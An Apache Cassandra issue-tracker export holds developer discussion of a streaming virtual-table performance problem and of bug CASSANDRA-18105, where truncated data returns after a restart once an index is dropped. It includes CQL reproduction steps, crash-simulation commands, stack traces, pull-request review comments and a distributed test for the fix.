{code};;;","03/Jan/23 16:57;cscotta;This one's a hall-of-famer for sure.;;;","04/Jan/23 20:50;dcapwell;[~jonmeredith] if you don't mind I can take this as you found the issue was caused by the vtable I worked on.

Looking at the code / stack trace the issue looks to be in org.apache.cassandra.streaming.StreamingState#handleStreamEvent the line 

{code}
sessions = Sessions.create(streamProgress.values());
{code}

The single usage of this field is org.apache.cassandra.db.virtual.StreamingVirtualTable#updateDataSet, which is only needed when the vtable is requested...

There are a few options I think we can take (can take multiple)

1) don't be eager and have org.apache.cassandra.streaming.StreamingState#sessions build on-demand from org.apache.cassandra.streaming.StreamingState#streamProgress
2) org.apache.cassandra.streaming.StreamingState#onSuccess and org.apache.cassandra.streaming.StreamingState#onFailure could build the sessions eagerly (like it does today), but push this logic to another thread
3) feature flag to allow tracking to be disabled (why I didn't do this in the first place....)
4) Sessions is just received/sent so why do we need to compute using 100% of events?  can we not just use a counter?

Given that building 1 session can take 15m, then #1 just breaks the vtable... for this reason I am in favor of #3 and #4... ill look closer to see if I can write #4 and see if there are any tradeoffs I don't see yet;;;","04/Jan/23 20:59;aratnofsky;For #3 - wouldn't disabling tracking mean that the virtual table isn't usable? This would put us in a situation where you can either use the vtable or stream successfully on larger clusters, which seems to defeat the purpose of the vtable.

 

I'm also in favor of #4.

 

I was also thinking of changing the pacing (via debounce) for individual file progress events, so a progress event does not trigger handleStreamEvent if it was called within the last X millis.;;;","05/Jan/23 03:03;dcapwell;bq. For #3 - wouldn't disabling tracking mean that the virtual table isn't usable?

Correct, this allows you to break the vtable if the feature causes things to not be stable.

bq. I'm also in favor of #4.

I am working on a patch doing both #3 and #4; so fix the issue by doing less work, and allow opt-out... 

bq. I was also thinking of changing the pacing (via debounce) for individual file progress events, so a progress event does not trigger handleStreamEvent if it was called within the last X millis.

I don't think we have enough people familiar with Streaming to make that safe... Even the vtable was a problem as no one is around who knows streaming!  Changing the pacing could have side effects non of us are aware of... ;;;","06/Jan/23 17:32;dcapwell;sent out a PR, but seems my bytesReceived/bytesSent needs to be changed... this one is a bit more annoying to deal with ;;;","06/Jan/23 17:52;dcapwell;more fun, SessionPreparedEvent is seen twice; we double post the same event!

Here is the stack trace for the 2 events on the same instance

{code}
first:
org.apache.cassandra.streaming.StreamingState.streamPrepared
org.apache.cassandra.streaming.StreamingState.handleStreamEvent
org.apache.cassandra.streaming.StreamResultFuture.fireStreamEvent
org.apache.cassandra.streaming.StreamResultFuture.handleSessionPrepared
org.apache.cassandra.streaming.StreamSession.prepareAsync
org.apache.cassandra.streaming.StreamSession.lambda$prepare$4

second:
org.apache.cassandra.streaming.StreamingState.streamPrepared
org.apache.cassandra.streaming.StreamingState.handleStreamEvent
org.apache.cassandra.streaming.StreamResultFuture.fireStreamEvent
org.apache.cassandra.streaming.StreamResultFuture.handleSessionPrepared
org.apache.cassandra.streaming.StreamSession.startStreamingFiles
org.apache.cassandra.streaming.StreamSession.prepareAck
org.apache.cassandra.streaming.StreamSession.messageReceived
org.apache.cassandra.streaming.StreamDeserializingTask.run
{code};;;","06/Jan/23 18:08;aratnofsky;> Changing the pacing could have side effects non of us are aware of...

I'm referring to the pacing of updates to the vtable data, not the streaming data. In org.apache.cassandra.streaming.StreamingState#handleStreamEvent, only update this.sessions on a FILE_PROGRESS event if it hasn't been updated in X millis. For other event types, update this.sessions right away.

This is my first thought at least - would reduce the time spent updating sessions when FILE_PROGRESS is frequent (which it should be). 

 

An even better solution would be to not re-create this.sessions but instead update it based on the deltas, since the incoming event should only update for a single ProgressInfo (peer, direction, file, etc) and the handler is already synchronized.;;;","06/Jan/23 18:29;dcapwell;pushed update that avoids the double counting of prepare and file progress events, this memory cost for file progress is less than before this patch, but it no longer is just updating a counter (we need the delta between events);;;","06/Jan/23 18:31;dcapwell;.bq I'm referring to the pacing of updates to the vtable data, not the streaming data. In org.apache.cassandra.streaming.StreamingState#handleStreamEvent, only update this.sessions on a FILE_PROGRESS event if it hasn't been updated in X millis. For other event types, update this.sessions right away.

We could, but that doesn't avoid the 15m to build a single event you and Jon saw.

.bq An even better solution would be to not re-create this.sessions but instead update it based on the deltas

yep, that's what I did, already sent out patch doing this!;;;","06/Jan/23 22:43;dcapwell;Update: I added a feature flag to disable tracking, and made it so the costs are lower and more predictable (file progress does require a ObjectLongHashMap to track per-file progress);;;","07/Jan/23 23:28;aratnofsky;Left review with a few questions on GitHub;;;","10/Jan/23 21:47;jonmeredith;+1;;;","11/Jan/23 21:52;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-18110-cassandra-4.1-880F7124-2E8C-43F5-891A-F37CABAF55FB]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-18110-cassandra-4.1-880F7124-2E8C-43F5-891A-F37CABAF55FB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2180/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-18110-trunk-880F7124-2E8C-43F5-891A-F37CABAF55FB]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-18110-trunk-880F7124-2E8C-43F5-891A-F37CABAF55FB]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/2181/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
TRUNCATED data come back after a restart or upgrade,CASSANDRA-18105,13510849,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,smiklosovic,kehan5800,kehan5800,09/Dec/22 00:03,26/Apr/23 11:53,13/Jul/23 08:40,26/Apr/23 11:52,3.0.29,3.11.15,4.0.10,4.1.2,5.0,,Feature/2i Index,,,,0,,"When we use the TRUNCATE command to delete all data in the table, the deleted data come back after a node restart or upgrade. This problem happens at the latest releases (2.2.19, 3.0.28, or 4.0.7)
h1. Steps to reproduce
h2. To reproduce it at release (3.0.28 or 4.0.7)

Start up a single Cassandra node. Using the default configuration and execute the following cqlsh commands.
{code:java}
CREATE KEYSPACE IF NOT EXISTS ks WITH REPLICATION = { 'class' : 'SimpleStrategy', 'replication_factor' : 1 };
CREATE TABLE  ks.tb (c3 TEXT,c4 TEXT,c2 INT,c1 TEXT, PRIMARY KEY (c1, c2, c3 ));
INSERT INTO ks.tb (c3, c1, c2) VALUES ('val1','val2',1);
CREATE INDEX IF NOT EXISTS tb ON ks.tb ( c3);
TRUNCATE TABLE ks.tb;
DROP INDEX IF EXISTS ks.tb; {code}
Execute a read command
{code:java}
cqlsh> SELECT c2 FROM ks.tb; 

 c2
----

(0 rows) {code}
Then, we flush the node and kill the Cassandra daemon by
{code:java}
bin/nodetool flush
pgrep -f cassandra | xargs kill -9 {code}
We restart the node. When the node has started, perform the same read, and the deleted data comes back again.
{code:java}
cqlsh> SELECT c2 FROM ks.tb; 

 c2
----
  1

(1 rows) {code}
h2. To reproduce it at release (2.2.19)

We don't need to kill the Cassandra daemon. Use bin/nodetool stopdaemon is enough. The other steps are the same as reproducing it at 4.0.7 or 3.0.28.
{code:java}
bin/nodetool -h ::FFFF:127.0.0.1 flush 
bin/nodetool -h ::FFFF:127.0.0.1 stopdaemon{code}
 

I have put the full log to reproduce it for release 4.0.7 and 2.2.19 in the comments.",,aleksey,jlewandowski,kehan5800,maedhroz,maxwellguo,paulo,smiklosovic,,,,,,,,"smiklosovic opened a new pull request, #2286:
URL: https://github.com/apache/cassandra/pull/2286

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;20/Apr/23 09:10;githubbot;600","smiklosovic commented on code in PR #2286:
URL: https://github.com/apache/cassandra/pull/2286#discussion_r1172308436


##########
test/distributed/org/apache/cassandra/distributed/test/IndexAndMVDroppingTest.java:
##########
@@ -0,0 +1,86 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.Cluster.build;
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
+import static org.apache.cassandra.distributed.api.Feature.NETWORK;
+import static org.junit.Assert.assertEquals;
+
+/**
+ * Tests CASSANDRA-18105.
+ * <p>
+ * Trucation will insert an entry to system.local into truncated_at map for given table. Because id of an index
+ * is same as id of the base table, when dropping an index, it in fact drops a table with same id as the base table
+ * which will remove an entry for trucated_at column. Hence, after restart of the node, querying the base table
+ * will resurrect the data because commitlog was fully replayed, not taking into consideration (now removed) entry
+ * in truncated_at column.
+ * <p>
+ * The fix consists of not removing an entry in trucated_at column in system.local
+ * if the table being removed is an index.
+ */
+public class IndexAndMVDroppingTest extends TestBaseImpl
+{
+    @Test
+    public void testIndexDropping() throws Throwable
+    {
+        try (Cluster c = build(1).withConfig(conf -> conf.with(NETWORK)).start())
+        {
+            c.schemaChange(""CREATE KEYSPACE "" + KEYSPACE + "" WITH REPLICATION = { 'class' : 'SimpleStrategy', 'replication_factor' : 1 }"");
+            c.schemaChange(""CREATE TABLE "" + KEYSPACE + "".tb (c3 TEXT, c4 TEXT, c2 INT, c1 TEXT, PRIMARY KEY (c1, c2, c3 ))"");
+            c.coordinator(1).execute(""INSERT INTO "" + KEYSPACE + "".tb (c3, c1, c2) VALUES ('val1','val2',1)"", ONE);
+            c.schemaChange(""CREATE INDEX tb ON "" + KEYSPACE + "".tb (c3)"");
+            c.schemaChange(""TRUNCATE TABLE "" + KEYSPACE + "" .tb"");
+            c.schemaChange(""DROP INDEX "" + KEYSPACE + "".tb"");
+
+            assertEquals(0, c.coordinator(1).execute(""SELECT c2 FROM "" + KEYSPACE + "" .tb"", ONE).length);
+
+            c.get(1).shutdown(true).get();
+            c.get(1).startup();
+
+            assertEquals(0, c.coordinator(1).execute(""SELECT c2 FROM "" + KEYSPACE + "" .tb"", ONE).length);
+        }
+    }
+
+    @Test
+    public void testMaterializedViewDropping() throws Throwable

Review Comment:
   I added MV case as well, just to be sure.



;20/Apr/23 09:13;githubbot;600","maedhroz commented on code in PR #2286:
URL: https://github.com/apache/cassandra/pull/2286#discussion_r1174053832


##########
src/java/org/apache/cassandra/db/ColumnFamilyStore.java:
##########
@@ -538,7 +538,9 @@ public void invalidate(boolean expectMBean)
 
         latencyCalculator.cancel(false);
         compactionStrategyManager.shutdown();
-        SystemKeyspace.removeTruncationRecord(metadata.cfId);
+
+        if (!metadata.isIndex())

Review Comment:
   nit: Might be a good idea to throw a comment inline, something like...
   
   > // Do not remove truncation records for index CFs, given they have the same ID as their backing/base tables.



;21/Apr/23 18:22;githubbot;600","maedhroz commented on code in PR #2286:
URL: https://github.com/apache/cassandra/pull/2286#discussion_r1174062984


##########
test/distributed/org/apache/cassandra/distributed/test/IndexAndMVDroppingTest.java:
##########
@@ -0,0 +1,86 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.Cluster.build;
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
+import static org.apache.cassandra.distributed.api.Feature.NETWORK;
+import static org.junit.Assert.assertEquals;
+
+/**
+ * Tests CASSANDRA-18105.
+ * <p>
+ * Trucation will insert an entry to system.local into truncated_at map for given table. Because id of an index
+ * is same as id of the base table, when dropping an index, it in fact drops a table with same id as the base table
+ * which will remove an entry for trucated_at column. Hence, after restart of the node, querying the base table
+ * will resurrect the data because commitlog was fully replayed, not taking into consideration (now removed) entry
+ * in truncated_at column.
+ * <p>
+ * The fix consists of not removing an entry in trucated_at column in system.local
+ * if the table being removed is an index.
+ */
+public class IndexAndMVDroppingTest extends TestBaseImpl
+{

Review Comment:
   nit: We could cut down running time a little if we share the cluster. Something like...
   
   ```
   private static Cluster CLUSTER;
   
   @BeforeClass
   public static void init() throws IOException
   {
       CLUSTER = init(Cluster.create(1, conf -> conf.with(NETWORK)));
   }
   
   @AfterClass
   public static void shutdown()
   {
       if (CLUSTER != null)
           CLUSTER.close();
   }
   
   @After
   public void reset()
   {
       if (CLUSTER.get(1).isShutdown())
           CLUSTER.get(1).startup(); // make sure we get the cluster running for test that follow a poorly timed failure
   }
   ```



;21/Apr/23 18:33;githubbot;600","Maxwell-Guo commented on code in PR #2286:
URL: https://github.com/apache/cassandra/pull/2286#discussion_r1172320918


##########
test/distributed/org/apache/cassandra/distributed/test/IndexAndMVDroppingTest.java:
##########
@@ -0,0 +1,86 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.distributed.test;
+
+import org.junit.Test;
+
+import org.apache.cassandra.distributed.Cluster;
+
+import static org.apache.cassandra.distributed.Cluster.build;
+import static org.apache.cassandra.distributed.api.ConsistencyLevel.ONE;
+import static org.apache.cassandra.distributed.api.Feature.NETWORK;
+import static org.junit.Assert.assertEquals;
+
+/**
+ * Tests CASSANDRA-18105.
+ * <p>
+ * Trucation will insert an entry to system.local into truncated_at map for given table. Because id of an index

Review Comment:
   Trucation -> Truncation ?  Am I right?



;24/Apr/23 02:52;githubbot;600","smiklosovic opened a new pull request, #2289:
URL: https://github.com/apache/cassandra/pull/2289

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;24/Apr/23 09:32;githubbot;600","smiklosovic opened a new pull request, #2290:
URL: https://github.com/apache/cassandra/pull/2290

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;24/Apr/23 09:34;githubbot;600","smiklosovic opened a new pull request, #2291:
URL: https://github.com/apache/cassandra/pull/2291

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;24/Apr/23 09:35;githubbot;600","smiklosovic opened a new pull request, #2292:
URL: https://github.com/apache/cassandra/pull/2292

   Thanks for sending a pull request! Here are some tips if you're new here:
    
    * Ensure you have added or run the [appropriate tests](https://cassandra.apache.org/_/development/testing.html) for your PR.
    * Be sure to keep the PR description updated to reflect all changes.
    * Write your PR title to summarize what this PR proposes.
    * If possible, provide a concise example to reproduce the issue for a faster review.
    * Read our [contributor guidelines](https://cassandra.apache.org/_/development/index.html)
    * If you're making a documentation change, see our [guide to documentation contribution](https://cassandra.apache.org/_/development/documentation.html)
    
   Commit messages should follow the following format:
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <Authors>; reviewed by <Reviewers> for CASSANDRA-#####
   
   Co-authored-by: Name1 <email1>
   Co-authored-by: Name2 <email2>
   
   ```
   
   The [Cassandra Jira](https://issues.apache.org/jira/projects/CASSANDRA/issues/)
   
   


;24/Apr/23 09:36;githubbot;600","smiklosovic closed pull request #2286: CASSANDRA-18105 3.0
URL: https://github.com/apache/cassandra/pull/2286


;26/Apr/23 11:53;githubbot;600","smiklosovic closed pull request #2289: CASSANDRA-18105 3.11
URL: https://github.com/apache/cassandra/pull/2289


;26/Apr/23 11:53;githubbot;600","smiklosovic closed pull request #2290: CASSANDRA-18105 - 4.0
URL: https://github.com/apache/cassandra/pull/2290


;26/Apr/23 11:53;githubbot;600","smiklosovic closed pull request #2291: CASSANDRA-18105 - 4.1
URL: https://github.com/apache/cassandra/pull/2291


;26/Apr/23 11:53;githubbot;600","smiklosovic closed pull request #2292: CASSANDRA-18105 - trunk
URL: https://github.com/apache/cassandra/pull/2292


;26/Apr/23 11:53;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,8400,,,0,8400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,smiklosovic,,,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Apr 25 17:04:20 UTC 2023,,,,,,,All,,,,"0|z1dkjk:",9223372036854775807,,,,maedhroz,maxwellguo,,,Normal,,3.0.0,,https://github.com/apache/cassandra/commit/4f348786bd6d72f4402134a29ddb3355b1fade61,,,,,,,,,CI and units,,,,,"09/Dec/22 04:09;maedhroz;Does this only manifest when there is an index present?;;;","09/Dec/22 06:19;kehan5800;[~maedhroz] Thanks for the reply. Yes. The index is necessary to trigger it. ;;;","09/Dec/22 06:57;maxwellguo;for 4.0.7 I tried ，but failed. I can not reproduce it ;;;","09/Dec/22 07:31;kehan5800;[~maxwellguo] Could you try 3.0.28 or 2.2.19? I just reproduced at those two versions.;;;","09/Dec/22 15:33;brandon.williams;This doesn't reproduce against 3.0 head.  I'm not going to hunt down java7 to attempt 2.2 since I don't have any reason to believe it will reproduce there either.;;;","09/Dec/22 16:45;kehan5800;Thanks so much for the reply! [~brandon.williams] [~maxwellguo] . I am sorry for one mistake I made about the reproduce procedure. To reproduce it at 3.0.28 or 4.0.7, we need to kill the Cassandra process after the flush. But for 2.2.19, we can perform a normal shutdown by {{{}bin/nodetool stopdaemon{}}}. Here's the detailed log on how I reproduced it.

*To reproduce it at 4.0.7 or 3.0.28* (Both Java8), after flushing the node, I stop Cassandra process by {{{}pgrep -f cassandra | xargs kill -9{}}}. Then I directly restart the Cassandra. The deleted data shows again. Here's the full log I got to reproduce it at 4.0.7 release.
{code:java}
➜  apache-cassandra-4.0.7 bin/cassandra
➜  apache-cassandra-4.0.7 CompilerOracle: dontinline org/apache/cassandra/db/Columns$Serializer.deserializeLargeSubset (Lorg/apache/cassandra/io/util/DataInputPlus;Lorg/apache/cassandra/db/Columns;I)Lorg/apache/cassandra/db/Columns;
......

➜  apache-cassandra-4.0.7 bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042
[cqlsh 6.0.0 | Cassandra 4.0.7 | CQL spec 3.4.5 | Native protocol v5]
Use HELP for help.
cqlsh> CREATE KEYSPACE IF NOT EXISTS ks WITH REPLICATION = { 'class' : 'SimpleStrategy', 'replication_factor' : 1 };
cqlsh> CREATE TABLE  ks.tb (c3 TEXT,c4 TEXT,c2 INT,c1 TEXT, PRIMARY KEY (c1, c2, c3 ));
cqlsh> INSERT INTO ks.tb (c3, c1, c2) VALUES ('val1','val2',1);
cqlsh> CREATE INDEX IF NOT EXISTS tb ON ks.tb ( c3);
cqlsh> TRUNCATE TABLE ks.tb;
cqlsh> DROP INDEX IF EXISTS ks.tb; 
cqlsh> SELECT c2 FROM ks.tb; 
 c2
----

(0 rows)
➜  apache-cassandra-4.0.7 bin/nodetool flush
➜  apache-cassandra-4.0.7 pgrep -f cassandra | xargs kill -9
➜  apache-cassandra-4.0.7 bin/cassandra
➜  apache-cassandra-4.0.7 CompilerOracle: dontinline org/apache/cassandra/db/Columns$Serializer.deserializeLargeSubset (Lorg/apache/cassandra/io/util/DataInputPlus;Lorg/apache/cassandra/db/Columns;I)Lorg/apache/cassandra/db/Columns;
......

➜  apache-cassandra-4.0.7 bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042
[cqlsh 6.0.0 | Cassandra 4.0.7 | CQL spec 3.4.5 | Native protocol v5]
Use HELP for help.
cqlsh> SELECT c2 FROM ks.tb; 
 c2
----
  1

(1 rows) {code}
 

*To reproduce it at 2.2.19* (Java8). We can stop the Cassandra daemon normally to trigger it. Here's the full log I got for 2.2.19.
{code:java}
➜  apache-cassandra-2.2.19 bin/cassandra
➜  apache-cassandra-2.2.19 OpenJDK 64-Bit Server VM warning: Cannot open file bin/../logs/gc.log due to No such file or directoryCompilerOracle: inline org/apache/cassandra/db/AbstractNativeCell.compareTo (Lorg/apache/cassandra/db/composites/Composite;)I
......

➜  apache-cassandra-2.2.19 bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042.
[cqlsh 5.0.1 | Cassandra 2.2.19 | CQL spec 3.3.1 | Native protocol v4]
Use HELP for help.
cqlsh> CREATE KEYSPACE IF NOT EXISTS ks WITH REPLICATION = { 'class' : 'SimpleStrategy', 'replication_factor' : 1 };
cqlsh> CREATE TABLE  ks.tb (c3 TEXT,c4 TEXT,c2 INT,c1 TEXT, PRIMARY KEY (c1, c2, c3 ));
cqlsh> INSERT INTO ks.tb (c3, c1, c2) VALUES ('val1','val2',1);
cqlsh> CREATE INDEX IF NOT EXISTS tb ON ks.tb ( c3);
cqlsh> TRUNCATE TABLE ks.tb;
cqlsh> DROP INDEX IF EXISTS ks.tb; 
cqlsh> SELECT c2 FROM ks.tb;
 c2
----

(0 rows)

➜  apache-cassandra-2.2.19 bin/nodetool -h ::FFFF:127.0.0.1 flush     
➜  apache-cassandra-2.2.19 bin/nodetool -h ::FFFF:127.0.0.1 stopdaemon
Cassandra has shutdown.
error: Connection refused (Connection refused)
-- StackTrace --
java.net.ConnectException: Connection refused (Connection refused)
    at java.net.PlainSocketImpl.socketConnect(Native Method)
    at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
    at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
    at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
    at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
    at java.net.Socket.connect(Socket.java:607)
    at java.net.Socket.connect(Socket.java:556)
    at java.net.Socket.<init>(Socket.java:452)
    at java.net.Socket.<init>(Socket.java:229)
    at sun.rmi.transport.proxy.RMIDirectSocketFactory.createSocket(RMIDirectSocketFactory.java:40)
    at sun.rmi.transport.proxy.RMIMasterSocketFactory.createSocket(RMIMasterSocketFactory.java:148)
    at sun.rmi.transport.tcp.TCPEndpoint.newSocket(TCPEndpoint.java:617)
    at sun.rmi.transport.tcp.TCPChannel.createConnection(TCPChannel.java:216)
    at sun.rmi.transport.tcp.TCPChannel.newConnection(TCPChannel.java:202)
    at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:132)
    at com.sun.jmx.remote.internal.PRef.invoke(Unknown Source)
    at javax.management.remote.rmi.RMIConnectionImpl_Stub.close(Unknown Source)
    at javax.management.remote.rmi.RMIConnector.close(RMIConnector.java:505)
    at javax.management.remote.rmi.RMIConnector.close(RMIConnector.java:445)
    at org.apache.cassandra.tools.NodeProbe.close(NodeProbe.java:243)
    at org.apache.cassandra.tools.NodeTool$NodeToolCmd.runInternal(NodeTool.java:286)
    at org.apache.cassandra.tools.NodeTool$NodeToolCmd.run(NodeTool.java:268)
    at org.apache.cassandra.tools.NodeTool.execute(NodeTool.java:174)
    at org.apache.cassandra.tools.NodeTool.main(NodeTool.java:56)
    
➜  apache-cassandra-2.2.19 bin/cassandra
Starting up...

➜  apache-cassandra-2.2.19 bin/cqlsh
Connected to Test Cluster at 127.0.0.1:9042.
[cqlsh 5.0.1 | Cassandra 2.2.19 | CQL spec 3.3.1 | Native protocol v4]
Use HELP for help.
cqlsh> SELECT c2 FROM ks.tb;
 c2
----
  1

(1 rows) {code}
 ;;;","09/Dec/22 17:00;brandon.williams;Thanks [~kehan5800], that indeed reproduces, and I confirmed it requires the 2i to occur.;;;","10/Dec/22 08:25;maxwellguo;I reproduce it too， [~brandonwilliams]  I think I can take a look at this issue ;;;","12/Apr/23 15:53;smiklosovic;I try to take a look at this as no progress was done since the last year. ;;;","12/Apr/23 16:17;maxwellguo;I have found out the reason that time as the data still exist in commitlog and the lowbond of commitlog have changed as index been created（The description may not be clear because it is too long）.That time I just discard the commitlog ‘s data at truncate stage，And this problem is solved。At that time, as the patch is not ready and I was busy with other things temporarily, so this issue did not progress further. And thank you for your help [~smiklosovic]  I think I can help to do some review latter;;;","12/Apr/23 16:54;maedhroz;[~maxwellguo] Does it also not reproduce if the index is created before the INSERT?;;;","13/Apr/23 03:39;maxwellguo;[~maedhroz]It seems can also reproduce .;;;","19/Apr/23 15:31;smiklosovic;Together with great help of [~samt] we found the problem. Basically, upon dropping of an index, it will eventually call (1) but the problem is that id of index is same as id of the base table. So it will remove the record from the truncate_at map in system.local for the base table. So TRUNCATE will put that record there but next DROP of index will remove it from there.

If you notice, index has same id as base table because of this (2)

It was said to me that there is some reason behind the sharing of the id between base table and the index but we should probably revisit this decision. I am personally not sure why it is done like that.

The fix consists of simple check to not remove the trucated_at entry when table metadata is of an index:
{code:java}
        if (!metadata.get().isIndex())
            SystemKeyspace.removeTruncationRecord(metadata.id);
{code}
